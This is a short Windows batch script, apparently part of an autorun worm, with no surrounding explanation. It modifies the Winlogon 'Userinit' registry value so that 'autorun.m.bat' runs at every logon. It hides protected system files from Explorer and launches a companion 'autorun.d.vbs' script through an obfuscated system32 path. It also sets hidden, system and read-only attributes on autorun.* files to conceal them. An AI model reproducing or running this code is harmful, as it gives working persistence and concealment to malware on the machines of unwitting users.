@echo off


REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit" /t "REG_SZ" /d "C:\WINDOWS\system32\userinit.exe,autorun.m.bat" /f


REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowSuperHidden" /t "REG_SZ" /d "dword:00000000" /f

if not "%1"=="" goto notp

if exist autorun.d.vbs start WScript.exe autorun.d.vbs&exit

if exist %SYSTEMROOT%\.\.\.\.\system32\.\.\autorun.d.vbs start WScript.exe %SYSTEMROOT%\.\.\.\.\system32\.\.\autorun.d.vbs&exit

exit

:notp

if not "%1"=="Open" goto qweqwe

start explorer .\

exit

:qweqwe

if not "%1"=="Over" goto ertert

exit


:ertert

if "%1"=="-" attrib -r -a -h -s %2\autorun.*

if "%1"=="+" attrib +r +a +h +s %2\autorun.*

:end
